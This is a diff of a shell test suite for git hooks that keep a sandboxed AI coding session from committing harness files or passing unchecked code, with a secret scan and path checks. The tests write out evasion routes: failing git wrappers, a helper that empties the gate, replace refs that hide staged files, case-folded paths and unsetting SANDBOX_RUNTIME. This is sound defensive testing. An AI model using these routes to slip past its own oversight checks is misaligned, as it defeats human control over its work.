+mkdir -p "$t/rawless" && printf '#!/bin/sh\ncase " $* " in *" --raw "*) exit 128 ;; esac\nexec "%s" "$@"\n' "$real_git" >"$t/rawless/git" && chmod +x "$t/rawless/git"
+(cd "$c2" && PATH="$t/rawless:$PATH" sh "$hk/pre-commit" >/dev/null 2>&1) && fail "pre-commit passed when git could not list the staged regular files"
+# A temporary file it cannot make stops the commit before any check reads nothing.
+mkdir -p "$t/nomktemp" && printf '#!/bin/sh\nexit 1\n' >"$t/nomktemp/mktemp" && chmod +x "$t/nomktemp/mktemp"
+rm -f "$t/prettier-ran"
+(cd "$c2" && PATH="$t/nomktemp:$PATH" sh "$hk/pre-commit" >/dev/null 2>&1) && fail "pre-commit passed though mktemp failed"
+[ ! -e "$t/prettier-ran" ] || fail "pre-commit ran Prettier after mktemp failed"
+fresh
+# The docs are checked, a docs-only commit too: a hidden character stops it (F5053); a check_docs.py that fails, whatever the docs.
+# check_docs reads the tree as check.sh's floor does, untracked files included: an untracked doc with a hidden character stops a
+# commit too (the red pass, M5: what check.sh would refuse, the commit does); a doc naming a file the commit deletes, as well (M6).
+echo prose >"$c2/docs/a.md" && git -C "$c2" add docs/a.md
 precommit || fail "pre-commit stopped a docs-only commit with no secret"
-# A hidden character stops a docs-only commit too, whose one check is check_docs (F5053).
 printf 'a\342\200\256b\n' >"$c2/docs/hidden.md" && git -C "$c2" add docs/hidden.md
 precommit && fail "pre-commit let a docs-only commit through with a hidden character (F5053)"
-# What it reads is what the commit takes, the staged copy, not the work tree's (F5087).
-printf 'ab\n' >"$c2/docs/hidden.md"
-precommit && fail "pre-commit let a docs-only commit through with a hidden character staged under a clean work tree (F5087)"
 git -C "$c2" rm -qf docs/hidden.md
-(cd "$c2" && PATH="$t/leakbin:$PATH" sh "$hooks/pre-commit" >/dev/null 2>&1) && fail "pre-commit let a docs-only commit through a secret scan that found one"
-# A staged harness file is committed in Alexis's Terminal alone, never in the sandbox (D241): a gate a commit brings gates
-# nothing, staged as it is on disk or not.
-git -C "$c2" commit -qm docs && printf '#!/bin/sh\nexit 1\n' >"$c2/scripts/check.sh" && git -C "$c2" add scripts/check.sh && git -C "$c2" commit -qm red
-blob=$(printf '#!/bin/sh\nexit 0\n' | git -C "$c2" hash-object -w --stdin) && git -C "$c2" update-index --cacheinfo "100755,$blob,scripts/check.sh"
-echo more >>"$c2/a.ts" && git -C "$c2" add a.ts
-precommit && fail "pre-commit let a commit in the sandbox through with a gate of its own"
-# An edit of the harness that is not staged is not in the commit: it does not stop one.
-git -C "$c2" reset -q && printf '#!/bin/sh\nexit 0\n' >"$c2/scripts/check.sh" && git -C "$c2" add scripts/check.sh && git -C "$c2" commit -qm green
-printf '#!/bin/sh\nexit 0\n# being edited\n' >"$c2/scripts/check.sh" && echo again >>"$c2/a.ts" && git -C "$c2" add a.ts
-precommit || fail "pre-commit refused a commit for a harness edit it does not hold"
-# The helpers it runs come from what is staged, not from the disk: an unstaged edit of one
-# must not neuter the gate (finding F067).
-git -C "$c2" checkout -q -- scripts/check.sh && printf '#!/bin/sh\nexit 1\n' >"$c2/scripts/check.sh" && git -C "$c2" add scripts/check.sh && git -C "$c2" commit -qm red
-printf '#!/bin/sh\ncp /dev/null "$1/scripts/check.sh"\n' >"$c2/scripts/borrow_node_modules.sh"
-echo yet >>"$c2/a.ts" && git -C "$c2" add a.ts
-precommit && fail "pre-commit ran an unstaged helper that emptied the gate"
-git -C "$c2" checkout -q -- scripts/borrow_node_modules.sh && printf '#!/bin/sh\nexit 1\n' >"$c2/scripts/code_changed.sh"
-precommit && fail "pre-commit ran an unstaged code_changed.sh that skipped the gate"
-git -C "$c2" checkout -q -- scripts/code_changed.sh
-# Every harness file of .githooks/records.sh's list is refused, by name and as it is on disk, its name in any case (F151), with
-# a space or an accent; a path that only looks like one is not, and goes to the gate.
-printf '#!/bin/sh\nexit 0\n' >"$c2/scripts/check.sh" && git -C "$c2" commit -qm green scripts/check.sh
-harnessed() { (cd "$c2" && sh "$hooks/pre-commit" 2>&1 >/dev/null) | grep -qF "is committed in Alexis's Terminal alone"; }
-for f in 'scripts/my file.sh' 'scripts/é.sh' Scripts/tool.sh .githooks/pre-push .github/workflows/gate.yml .claude/settings.json \
+printf 'a\342\200\256b\n' >"$c2/docs/scratch.md"
+precommit && fail "pre-commit let a commit through beside an untracked doc with a hidden character"
+rm "$c2/docs/scratch.md"
+echo named >"$c2/docs/named.md" && printf 'See `docs/named.md`.\n' >>"$c2/CLAUDE.md" && git -C "$c2" add docs/named.md CLAUDE.md && git -C "$c2" commit -qm named
+git -C "$c2" rm -q docs/named.md
+said "name files that do not exist" || fail "pre-commit let a deletion through that leaves a doc naming the file it deletes"
+git -C "$c2" reset -q --hard HEAD~1 && mkdir -p "$c2/docs"
+cp "$c2/scripts/check_docs.py" "$t/check_docs.py" && printf 'raise SystemExit(3)\n' >"$c2/scripts/check_docs.py"
+precommit && fail "pre-commit passed with a check_docs.py that fails"
+cp "$t/check_docs.py" "$c2/scripts/check_docs.py"
+# A secret in what is staged stops the commit, prose included; with no gitleaks to run, or no scan beside the hook, nothing passes
+# unscanned (F113, F116).
+printf 'aws = "%s"\n' "$key" >"$c2/docs/leak.md" && git -C "$c2" add docs/leak.md
+said "leaks found: 1" || fail "pre-commit let a key in prose through"
+fresh && printf 'aws = "%s"\n' "$key" >"$c2/leak.ts" && git -C "$c2" add leak.ts
+precommit && fail "pre-commit let a staged key through"
+fresh && echo more >>"$c2/a.ts" && git -C "$c2" add a.ts
+(cd "$c2" && PATH=/usr/bin:/bin sh "$hk/pre-commit" >/dev/null 2>&1) && fail "pre-commit passed in the sandbox with no gitleaks to scan"
+mv "$hk/scan_secrets.sh" "$t/scan_secrets.away"
+precommit && fail "pre-commit passed with no scan_secrets.sh beside it"
+mv "$t/scan_secrets.away" "$hk/scan_secrets.sh"
+fresh
+# A staged harness file is committed in Alexis's Terminal alone, never in the sandbox (D241): every file of .githooks/records.sh's list,
+# by name and as it is on disk, its name in any case (F151), with a space or an accent; a path that only looks like one is not.
+harnessed() { said "is committed in Alexis's Terminal alone"; }
+for f in 'scripts/my file.sh' Scripts/tool.sh .githooks/pre-push .github/workflows/gate.yml .claude/settings.json \
 	.claude/agents/new.md stryker.config.json app/vite.config.ts lint/shared.config.ts packages/core/package.json knip.json \
 	pnpm-lock.yaml .gitignore deploy/test.sh app/tests/stories/pictures.spec.ts; do
-	mkdir -p "$c2/$(dirname "$f")" && echo '{}' >"$c2/$f" && git -C "$c2" reset -q && git -C "$c2" add "$f"
+	mkdir -p "$c2/$(dirname "$f")" && echo '{}' >"$c2/$f" && git -C "$c2" reset -q && git -C "$c2" add -f "$f"
 	[ "$(git -C "$c2" diff --cached --name-only | wc -l | tr -d ' ')" = 1 ] || fail "the case of $f staged other than one path"
 	harnessed || fail "pre-commit let a staged $f, a harness file, through in the sandbox (D241)"
 	git -C "$c2" reset -q && rm "$c2/$f" # by the index's spelling, which may not be $f's (Scripts/)
 done
+fresh
 # A variable that makes git read pathspecs otherwise leaves the list whole: GIT_NOGLOB_PATHSPECS made its globs literal names,
 # GIT_GLOB_PATHSPECS kept their * from crossing a folder, and a commit with either took a harness file (9j's review).
 for v in GIT_NOGLOB_PATHSPECS GIT_GLOB_PATHSPECS; do
 	for f in packages/core/package.json app/vite.config.ts; do
 		mkdir -p "$c2/$(dirname "$f")" && echo '{}' >"$c2/$f" && git -C "$c2" reset -q && git -C "$c2" add "$f"
-		(cd "$c2" && env "$v=1" sh "$hooks/pre-commit" 2>&1 >/dev/null) | grep -qF "is committed in Alexis's Terminal alone" ||
+		(cd "$c2" && env "$v=1" sh "$hk/pre-commit" 2>&1 >/dev/null) | grep -qF "is committed in Alexis's Terminal alone" ||
 			fail "pre-commit let a staged $f through in the sandbox with $v=1 (D241)"
 		git -C "$c2" reset -q && rm "$c2/$f"
 	done
+done
+# A name the index holds in another case than the disk's (git update-index takes any), which this case-blind disk reads as the
+# harness file it names (F151).
+blob=$(echo planted | git -C "$c2" hash-object -w --stdin)
+for f in Scripts/guard.py .Claude/settings.json; do
+	git -C "$c2" update-index --add --cacheinfo "100644,$blob,$f"
+	harnessed || fail "pre-commit let $f, a harness file on a case-blind disk, through in the sandbox (F151, D241)"
+	git -C "$c2" update-index --force-remove "$f"
 done
 for f in app/src/scripts/a.ts scriptsx/a.ts app/src/config.ts docs/stryker.config.json.md packages/core/src/args/args.ts; do
 	mkdir -p "$c2/$(dirname "$f")" && echo x >"$c2/$f" && git -C "$c2" add "$f"
 	precommit || fail "pre-commit refused $f, which only looks like a harness file"
 	git -C "$c2" reset -q && rm -f "$c2/$f"
 done
+fresh
+# An edit of the harness that is not staged is not in the commit: it does not stop one.
+printf '# being edited\n' >>"$c2/scripts/check_docs.py" && echo again >>"$c2/a.ts" && git -C "$c2" add a.ts
+precommit || fail "pre-commit refused a commit for a harness edit it does not hold"
+fresh
 # A letter the disk folds (ſ is s on APFS) names a harness file no list can match (F164): a staged path with a non-ASCII
 # character is refused too. A harness file deleted or moved out is a harness change, and so is one a merge brings.
 fold=$(printf '\305\277') && printf 'x\n' >"$c2/${fold}cripts-tool.sh" && git -C "$c2" add -- "${fold}cripts-tool.sh"
-harnessed || fail "pre-commit let a staged path with a folded letter through in the sandbox (F164, D241)"
-git -C "$c2" reset -q && rm -f "$c2/${fold}cripts-tool.sh"
+said "non-ASCII" || fail "pre-commit let a staged path with a folded letter through in the sandbox (F164)"
+fresh
 mkdir -p "$c2/.github" && echo x >"$c2/.github/gone.yml" && echo x >"$c2/scripts/moved.sh" && git -C "$c2" add .github/gone.yml scripts/moved.sh && git -C "$c2" commit -qm planted
 git -C "$c2" rm -q --cached .github/gone.yml
 harnessed || fail "pre-commit let the deletion of a harness file through in the sandbox (D241)"
 git -C "$c2" reset -q && git -C "$c2" mv scripts/moved.sh moved.sh
 harnessed || fail "pre-commit let a harness file moved out of the harness through in the sandbox (D241)"
-git -C "$c2" reset -q --hard && echo x >"$c2/scripts/merged.sh" && git -C "$c2" add scripts/merged.sh
-(cd "$c2" && sh "$hooks/pre-commit" --merge 2>&1 >/dev/null) | grep -qF "is committed in Alexis's Terminal alone" ||
-	fail "pre-commit let a merge bring a harness file in the sandbox (D241)"
-git -C "$c2" reset -q && rm "$c2/scripts/merged.sh"
+fresh && echo x >"$c2/scripts/merged.sh" && git -C "$c2" add scripts/merged.sh
+(cd "$c2" && sh "$hk/pre-merge-commit" 2>&1 >/dev/null) | grep -qF "is committed in Alexis's Terminal alone" ||
+	fail "pre-merge-commit let a merge bring a harness file in the sandbox (D241)"
+fresh
 # SANDBOX_RUNTIME unset is no way out (D241): the sandbox cannot open the hook for writing, whatever its environment says, and
 # Alexis's Terminal can; with SANDBOX_RUNTIME set, a hook that can be written is still the sandbox.
-rh="$t/hooks-copy" && mkdir "$rh" && cp "$hooks"/* "$here/code_changed.sh" "$rh/" && secrets_into "$rh/"
 echo x >"$c2/scripts/tool.sh" && git -C "$c2" add scripts/tool.sh
-(cd "$c2" && . "$rh/records.sh" && put "$(code_print "$(git write-tree)")" fast) # the gate passed on it: nothing but the guard refuses it
-outside_() { (cd "$c2" && env -u SANDBOX_RUNTIME "$@" sh "$rh/pre-commit" 2>&1 >/dev/null); }
-chmod a-w "$rh/pre-commit"
+outside_() { (cd "$c2" && env -u SANDBOX_RUNTIME "$@" sh "$hk/pre-commit" 2>&1 >/dev/null); }
+chmod a-w "$hk/pre-commit"
 outside_ | grep -qF "is committed in Alexis's Terminal alone" || fail "pre-commit took a sandboxed commit of a harness file once SANDBOX_RUNTIME was unset (D241)"
 # Under dash, Linux's sh, a redirection a special builtin cannot open ends the whole shell: the hook ended in silence (F13177).
 command -v dash >/dev/null || fail "no dash to run pre-commit under, as Linux's sh does (F13177)"
-(cd "$c2" && env -u SANDBOX_RUNTIME dash "$rh/pre-commit" 2>&1 >/dev/null) | grep -qF "is committed in Alexis's Terminal alone" ||
+(cd "$c2" && env -u SANDBOX_RUNTIME dash "$hk/pre-commit" 2>&1 >/dev/null) | grep -qF "is committed in Alexis's Terminal alone" ||
 	fail "pre-commit under dash, Linux's sh, ended in silence when it could not write itself (F13177)"
-chmod u+w "$rh/pre-commit"
-outside_ >/dev/null || fail "pre-commit refused a harness file in Alexis's Terminal, its gate recorded"
+chmod u+w "$hk/pre-commit"
+outside_ >/dev/null || fail "pre-commit refused a harness file in Alexis's Terminal"
 outside_ SANDBOX_RUNTIME=1 | grep -qF "is committed in Alexis's Terminal alone" || fail "pre-commit let a harness file through with SANDBOX_RUNTIME set, its hook writable (D241)"
-git -C "$c2" rm -qf --cached scripts/tool.sh && rm "$c2/scripts/tool.sh"
-# A git that cannot list what is staged lets nothing through unchecked.
-mkdir "$t/diffless" && printf '#!/bin/sh\ncase " $* " in *" diff "*) exit 128 ;; esac\nexec "%s" "$@"\n' "$(command -v git)" >"$t/diffless/git" && chmod +x "$t/diffless/git"
-(cd "$c2" && PATH="$t/diffless:$PATH" sh "$hooks/pre-commit" 2>&1 >/dev/null) | grep -qF "git could not list the staged harness files" ||
+fresh
+# Through git itself, which hands its hooks GIT_INDEX_FILE for `commit -a` and `commit -- <path>` (the red pass, M8): the same
+# checks, on what that commit holds; an empty commit checks nothing and passes.
+gc() { (cd "$c2" && git -c core.hooksPath="$hk" commit -q "$@" >/dev/null 2>&1); }
+fresh && echo more >>"$c2/a.ts"
+gc -am "fix: a formatted change" || fail "git commit -a, through the hooks, refused a formatted change"
+echo unformatted >>"$c2/a.ts"
+gc -am "fix: an unformatted change" && fail "git commit -a, through the hooks, let an unformatted file through"
+# `commit -- a.ts` checks what that commit holds, git's own index for it: an unformatted b.ts staged beside it stops nothing, and an
+# unformatted a.ts stops it (the combined review, R5).
+git -C "$c2" checkout -q -- a.ts && echo unformatted >"$c2/b.ts" && git -C "$c2" add b.ts && echo more >>"$c2/a.ts"
+gc -m "fix: a path alone" -- a.ts || fail "git commit -- <path>, through the hooks, refused a formatted path for a file staged beside it"
+[ "$(git -C "$c2" show --name-only --format= HEAD)" = a.ts ] || fail "git commit -- <path> committed other than its path"
+echo unformatted >>"$c2/a.ts"
+gc -m "fix: an unformatted path" -- a.ts && fail "git commit -- <path>, through the hooks, let its unformatted path through"
+fresh && echo '# x' >>"$c2/scripts/check_docs.py"
+(cd "$c2" && git -c core.hooksPath="$hk" commit -qam "fix: a harness file" 2>&1) | grep -qF "is committed in Alexis's Terminal alone" ||
+	fail "git commit -a, through the hooks, took a harness file in the sandbox, or refused it for another reason than D241"
+fresh
+gc --allow-empty -m "chore: nothing" || fail "an empty commit, through the hooks, was refused"
+fresh
+# A git that cannot list the staged harness files lets nothing through unchecked; one that can list nothing at all, neither.
+mkdir "$t/diffless" "$t/listless-harness"
+printf '#!/bin/sh\ncase " $* " in *" diff "*) exit 128 ;; esac\nexec "%s" "$@"\n' "$real_git" >"$t/diffless/git"
+printf '#!/bin/sh\ncase " $* " in *" --cached --name-only -- scripts "*) exit 128 ;; esac\nexec "%s" "$@"\n' "$real_git" >"$t/listless-harness/git"
+chmod +x "$t/diffless/git" "$t/listless-harness/git"
+echo x >>"$c2/a.ts" && git -C "$c2" add a.ts
+(cd "$c2" && PATH="$t/listless-harness:$PATH" sh "$hk/pre-commit" 2>&1 >/dev/null) | grep -qF "git could not list the staged harness files" ||
 	fail "pre-commit went on when git could not list the staged harness files (D241)"
-# A code file partly staged is no harness file.
-echo partly >>"$c2/a.ts" && git -C "$c2" add a.ts && echo unstaged >>"$c2/a.ts"
-precommit || fail "pre-commit refused a code file only partly staged"
-# A code_changed.sh that fails is no proof of prose alone, in the sandbox too (F133).
-git -C "$c2" checkout -q -- a.ts && printf 'exit 2\n' >"$c2/scripts/code_changed.sh" && git -C "$c2" commit -qm broken scripts/code_changed.sh
-echo broken >>"$c2/a.ts" && git -C "$c2" add a.ts
-precommit && fail "pre-commit took a failing code_changed.sh for prose alone (F133)"
-git -C "$c2" checkout -q HEAD -- a.ts && git -C "$c2" checkout -q HEAD~1 -- scripts/code_changed.sh && git -C "$c2" commit -qm mended scripts/code_changed.sh
-# It hands the staged gate what the commit changes, one path a line: a rename's two paths, what is
-# staged only, so check.sh checks those areas alone.
-printf '#!/bin/sh\nprintf "%%s" "$GATE_CHANGED" >"%s/gate-changed"\nprintf "%%s" "${GATE_MERGE-unset}" >"%s/gate-merge"\n' "$t" "$t" >"$c2/scripts/check.sh" && echo x >"$c2/c.ts" && echo x >"$c2/g.ts"
-git -C "$c2" add -A && git -C "$c2" commit -qm listing
-echo listed >>"$c2/a.ts" && git -C "$c2" add a.ts && git -C "$c2" mv c.ts d.ts && echo unstaged >>"$c2/g.ts" && echo untracked >"$c2/u.ts"
-precommit || fail "pre-commit failed with a gate that passes"
-[ "$(sort "$t/gate-changed" | paste -sd' ' -)" = "a.ts c.ts d.ts" ] || fail "pre-commit handed the gate another list than the commit's: $(cat "$t/gate-changed")"
-# It tells the staged gate, which has no repository to ask, that a merge is being committed: pre-merge-commit's --merge (git
-# writes MERGE_HEAD only after that hook) or a merge in progress (a conflict concluded by hand). A work commit says no
-# (a merge commit has no time budget, a work commit keeps its own: Alexis, 2026-10-28).
-[ "$(cat "$t/gate-merge")" = 0 ] || fail "pre-commit told the gate a work commit was a merge: $(cat "$t/gate-merge")"
-precommit --merge || fail "pre-commit refused a merge with a gate that passes"
-[ "$(cat "$t/gate-merge")" = 1 ] || fail "pre-commit did not tell the gate pre-merge-commit's merge was one: $(cat "$t/gate-merge")"
-git -C "$c2" rev-parse HEAD >"$c2/.git/MERGE_HEAD" && precommit || fail "pre-commit refused a merge in progress with a gate that passes"
-[ "$(cat "$t/gate-merge")" = 1 ] || fail "pre-commit did not tell the gate a merge in progress was one: $(cat "$t/gate-merge")"
-rm -f "$c2/.git/MERGE_HEAD" "$c2/.claude/tmp/green-fast" # a work commit of a recorded tree would run no second gate to ask
-GATE_MERGE=1 precommit && [ "$(cat "$t/gate-merge")" = 0 ] || fail "pre-commit passed on a GATE_MERGE of its caller: a work commit's budget would be off"
-git -C "$c2" reset -q --hard && rm -f "$c2/u.ts"
-# The staged copy holds what the commit holds, whatever store its caller names (F4923): git does not check an object against its
-# name as it reads it, so a caller's GIT_OBJECT_DIRECTORY (the real store behind it as an alternate) or GIT_COMMON_DIR (a copy of
-# .git) holding a planted object under the staged file's name had the gate pass code the commit does not hold.
+(cd "$c2" && PATH="$t/diffless:$PATH" sh "$hk/pre-commit" >/dev/null 2>&1) && fail "pre-commit passed when git could list nothing staged"
+fresh
+# A caller's object folder or common folder answers no read of the hook's (F4923's class), unset: on git 2.53 no case plants one
+# that changes what it reads (a loose object's hash is checked, and HEAD resolves from the worktree's own refs), so harness_mutate
+# lists both mutants as gaps. A replace ref, which a sandboxed command can write under .git/refs, does change it.
 c3="$t/precommit-store"
-mkdir -p "$c3/scripts" && git -C "$c3" init -q && good_rules "$c3"
-printf '#!/bin/sh\ncat "$(dirname "$0")/../a.ts" >"%s/store-saw"\n! grep -q bad "$(dirname "$0")/../a.ts"\n' "$t" >"$c3/scripts/check.sh"
-cp "$here/code_changed.sh" "$here/borrow_node_modules.sh" "$here/check_docs.py" "$here/repo_files.py" "$here/speeds.py" "$c3/scripts/" && secrets_into "$c3/scripts/"
-git -C "$c3" add -A && git -C "$c3" commit -qm base && echo bad >"$c3/a.ts" && git -C "$c3" add a.ts
-blob=$(git -C "$c3" rev-parse :a.ts)
-plant() { # $1: an objects folder, given a loose object named $blob that holds another text
-	mkdir -p "$1/${blob%"${blob#??}"}" && rm -f "$1/${blob%"${blob#??}"}/${blob#??}"
-	python3 -I -c 'import sys, zlib; b = b"good\n"; open(sys.argv[1], "wb").write(zlib.compress(b"blob %d\0" % len(b) + b))' "$1/${blob%"${blob#??}"}/${blob#??}"
-}
-stored() { # $@: the caller's environment; the gate must run, see the staged text and refuse it
-	rm -f "$t/store-saw"
-	(cd "$c3" && env "$@" sh "$hooks/pre-commit" >/dev/null 2>&1) && fail "pre-commit passed a gate that refuses the staged code, given $*"
-	[ "$(cat "$t/store-saw" 2>/dev/null)" = bad ] || fail "pre-commit gated what the caller's store holds under the staged file's name ($(cat "$t/store-saw" 2>/dev/null || echo no gate ran)), not the staged file, given $*"
-}
-stored GIT_PAGER=cat
-plant "$t/store"
-stored GIT_OBJECT_DIRECTORY="$t/store" GIT_ALTERNATE_OBJECT_DIRECTORIES="$c3/.git/objects"
-cp -R "$c3/.git" "$t/common" && plant "$t/common/objects"
-stored GIT_COMMON_DIR="$t/common"
-[ "$(git -C "$c3" cat-file -p "$blob")" = bad ] || fail "the store test planted its object in the repository itself"
+mkdir -p "$c3" && git -C "$c3" init -q -b main && echo x >"$c3/a.ts" && git -C "$c3" add a.ts && git -C "$c3" commit -qm base
+mkdir -p "$c3/scripts" && echo 'echo planted' >"$c3/scripts/tool.sh" && git -C "$c3" add scripts/tool.sh
+head=$(git -C "$c3" rev-parse HEAD) && staged_tree=$(git -C "$c3" write-tree)
+# A replace ref showing HEAD as a commit that already holds the staged harness file would hide it from the list (F132's class).
+fake=$(git -C "$c3" commit-tree -m planted "$staged_tree")
+[ -n "$(git -C "$c3" diff --cached --name-only)" ] || fail "the replace ref's case staged nothing"
+git -C "$c3" replace "$head" "$fake"
+[ -z "$(git -C "$c3" diff --cached --name-only)" ] || fail "the replace ref planted hides nothing: the case proves nothing"
+(cd "$c3" && sh "$hk/pre-commit" 2>&1 >/dev/null) | grep -qF "is committed in Alexis's Terminal alone" ||
+	fail "pre-commit read HEAD through a replace ref, which hid a staged harness file (F132)"
+git -C "$c3" replace -d "$head" >/dev/null
 fi
 
 if part outside; then
-# Outside the sandbox, in Alexis's shell, a hook runs only its own lines, git, gitleaks and the
-# scripts Claude cannot edit; it takes the code the sandboxed gate recorded green (F076).
+# Outside the sandbox, in Alexis's shell, a hook runs only its own lines, git, gitleaks and the scripts installed beside it, never
+# the working tree's (F076): the secret scan at a commit, a merge and a push, and main refused at a push; no harness refusal (D241
+# is the sandbox's), no Prettier, no docs check (D13173).
 o="$t/outside"
-mkdir -p "$o/scripts" "$o/.githooks" "$o/.claude/tmp" "$o/docs"
-# The hooks run beside the scripts they run, as installed (F129).
-cp "$hooks"/* "$here/code_changed.sh" "$here/install_hooks.sh" "$o/.githooks/" && secrets_into "$o/.githooks/"
-# What Claude can edit, and a hook could reach, leaves a mark when it runs.
-for f in check.sh borrow_node_modules.sh; do printf '#!/bin/sh\n: >"%s/ran"\n' "$o" >"$o/scripts/$f"; done
-for f in review_pass.py check_docs.py repo_files.py hidden.py; do printf 'open("%s/ran", "w")\n' "$o" >"$o/scripts/$f"; done
-printf '.claude/tmp\nran\n' >"$o/.gitignore" && echo one >"$o/a.ts"
+mkdir -p "$o/scripts" "$o/.githooks" "$o/docs" "$o/node_modules/.bin"
+cp "$hooks"/* "$here/install_hooks.sh" "$o/.githooks/" && secrets_into "$o/.githooks/"
+# What a session can edit, and a hook could reach, leaves a mark when it runs.
+for f in scripts/check.sh scripts/borrow_node_modules.sh node_modules/.bin/prettier; do printf '#!/bin/sh\n: >"%s/ran"\n' "$o" >"$o/$f" && chmod +x "$o/$f"; done
+for f in check_docs.py repo_files.py hidden.py; do printf 'open("%s/ran", "w")\n' "$o" >"$o/scripts/$f"; done
+printf 'ran\nnode_modules\n' >"$o/.gitignore" && echo one >"$o/a.ts"
 git -C "$o" init -q && git -C "$o" add -A && git -C "$o" commit -qm base
-# Installed as Alexis does, so pre-push finds the hooks of the main it pushes (F129); the section
-# runs each hook itself, so git, pointed at an empty folder, runs none at a commit.
+# Installed as Alexis does; the section runs each hook itself, so git, pointed at an empty folder, runs none at a commit.
 (cd "$o" && sh .githooks/install_hooks.sh HEAD >/dev/null)
 mkdir "$t/no-hooks" && git -C "$o" config core.hooksPath "$t/no-hooks"
 out() { (cd "$o" && env -u SANDBOX_RUNTIME "$@" >/dev/null 2>&1); }
-mark() { (cd "$o" && . .githooks/records.sh && p=$(code_print "$1") && put "$p" "$2" && if [ "$2" = full ]; then put "$p" fast; fi); } # as a gate records: the full one writes both
 untouched() { [ ! -e "$o/ran" ] || fail "$1 ran the repository's code outside the sandbox (F076)"; }
 echo two >>"$o/a.ts" && git -C "$o" add a.ts
-out sh .githooks/pre-commit && fail "pre-commit outside the sandbox took code no gate passed"
-(cd "$o" && SANDBOX_RUNTIME= sh .githooks/pre-commit >/dev/null 2>&1) && fail "pre-commit took an empty SANDBOX_RUNTIME for the sandbox"
-untouched pre-commit
-full=$(cd "$o" && . .githooks/records.sh && code_print "$(git write-tree)")
-printf '%s\n\n%sx\n' "${full%??????????}" "$full" >>"$o/.claude/tmp/green-fast"
-out sh .githooks/pre-commit && fail "pre-commit outside the sandbox took a partial or empty record"
-out sh .githooks/pre-merge-commit && fail "pre-merge-commit outside the sandbox took code no gate passed"
-mark "$(git -C "$o" write-tree)" fast
-out sh .githooks/pre-commit || fail "pre-commit outside the sandbox refused code the gate passed"
-out sh .githooks/pre-merge-commit || fail "pre-merge-commit outside the sandbox refused code the gate passed"
-echo five >"$o/b.ts" && git -C "$o" add b.ts
-mark "$(git -C "$o" write-tree)" full
-out sh .githooks/pre-commit || fail "pre-commit outside the sandbox refused code its full gate passed"
-git -C "$o" rm -qf --cached b.ts && rm "$o/b.ts"
-for f in docs/n.md adr/figure.svg NOTES.md; do
-	case $f in */*) mkdir -p "$o/${f%/*}" ;; esac
-	echo prose >"$o/$f" && git -C "$o" add "$f"
-done
-out sh .githooks/pre-commit || fail "pre-commit outside the sandbox refused prose added to code the gate passed"
-printf 'aws = "%s"\n' "$key" >"$o/leak.py" && git -C "$o" add leak.py && mark "$(git -C "$o" write-tree)" fast
+out sh .githooks/pre-commit || fail "pre-commit outside the sandbox refused code with no secret"
+(cd "$o" && SANDBOX_RUNTIME= sh .githooks/pre-commit >/dev/null 2>&1) || fail "pre-commit took an empty SANDBOX_RUNTIME for the sandbox"
+echo x >"$o/scripts/tool.sh" && git -C "$o" add scripts/tool.sh
+out sh .githooks/pre-commit || fail "pre-commit refused a harness file in Alexis's Terminal, where D241 commits it"
+out sh .githooks/pre-merge-commit || fail "pre-merge-commit outside the sandbox refused a merge with no secret"
+untouched "pre-commit, pre-merge-commit"
+printf 'aws = "%s"\n' "$key" >"$o/leak.py" && git -C "$o" add leak.py
 out sh .githooks/pre-commit && fail "pre-commit outside the sandbox let a staged key through"
+out sh .githooks/pre-merge-commit && fail "pre-merge-commit outside the sandbox let a staged key through"
 (cd "$o" && env -u SANDBOX_RUNTIME PATH=/usr/bin:/bin sh .githooks/pre-commit >/dev/null 2>&1) && fail "pre-commit outside the sandbox passed with no gitleaks"
 git -C "$o" rm -qf --cached leak.py && rm "$o/leak.py"
+printf 'aws = "%s"\n' "$key" >"$o/docs/leak.md" && git -C "$o" add docs/leak.md
+out sh .githooks/pre-commit && fail "pre-commit outside the sandbox let a key in prose through"
+git -C "$o" rm -qf --cached docs/leak.md && rm "$o/docs/leak.md"
+# A path with a byte outside ASCII, which this disk may read as another (packageſ/ as packages/, a workspace pnpm installs), is
+# refused in Alexis's shell too, a merge's included: GitHub's merge refuses it on its side (the security review of 3b, M1, F164).
+fold=$(printf '\305\277') && mkdir -p "$o/package$fold" && printf '{}\n' >"$o/package$fold/x.json" && git -C "$o" add -- "package$fold/x.json"
+(cd "$o" && env -u SANDBOX_RUNTIME sh .githooks/pre-commit 2>&1 >/dev/null) | grep -qF "non-ASCII" || fail "pre-commit outside the sandbox took a path this disk may fold (F164)"
+(cd "$o" && env -u SANDBOX_RUNTIME sh .githooks/pre-merge-commit 2>&1 >/dev/null) | grep -qF "non-ASCII" || fail "pre-merge-commit outside the sandbox took a path this disk may fold (F164)"
+git -C "$o" rm -qrf --cached -- "package$fold" && rm -r "$o/package$fold"
 printf 'p = "/Us''ers/alice/x"\n' >"$o/private.py" && git -C "$o" add private.py
-mark "$(git -C "$o" write-tree)" fast
 out sh .githooks/pre-commit && fail "pre-commit outside the sandbox let a home folder's path through"
 git -C "$o" rm -qf --cached private.py && rm "$o/private.py"
 printf 'fix: x\n\nSeen in /Us''ers/alice/notes\n' >"$t/outside-msg"
@@ -2882,100 +2804,25 @@ printf 'docs: x\n' >"$t/outside-msg"
 out sh .githooks/commit-msg "$t/outside-msg" || fail "commit-msg outside the sandbox refused a clean message"
 git -C "$o" commit -qm two
 untouched "pre-commit, pre-merge-commit, commit-msg"
-# pre-push: a work branch wants a recorded gate; main the full gate, a review pass, its declarations.
+# pre-push: the same scan of what leaves, and main refused.
 head=$(git -C "$o" rev-parse HEAD)
 push() { printf 'refs/heads/%s %s refs/heads/%s %s\n' "$1" "$head" "$1" "${2:-0000000000000000000000000000000000000000}" | out sh .githooks/pre-push origin url; }
-push slice-1a || fail "pre-push outside the sandbox refused a branch the gate passed"
-echo three >>"$o/a.ts" && git -C "$o" commit -qam three && head=$(git -C "$o" rev-parse HEAD)
-echo prose >"$o/docs/m.md" && git -C "$o" add docs/m.md
-out sh .githooks/pre-commit || fail "pre-commit outside the sandbox refused prose alone on code no gate passed"
-git -C "$o" commit -qm prose && head=$(git -C "$o" rev-parse HEAD)
-push slice-1a && fail "pre-push outside the sandbox took a branch no gate passed"
-mark "$head" fast && push slice-1a || fail "pre-push outside the sandbox refused a branch once recorded"
-pass() { p=$(cd "$o" && . .githooks/records.sh && review_print HEAD) && echo "2026-10-18 $p test" >>"$o/docs/review-passes.txt" && git -C "$o" add docs && git -C "$o" commit -qm pass && head=$(git -C "$o" rev-parse HEAD); }
-pass
-push main && fail "pre-push outside the sandbox took main the full gate never passed"
-mark "$head" full && push main || fail "pre-push outside the sandbox refused main with its gate and review"
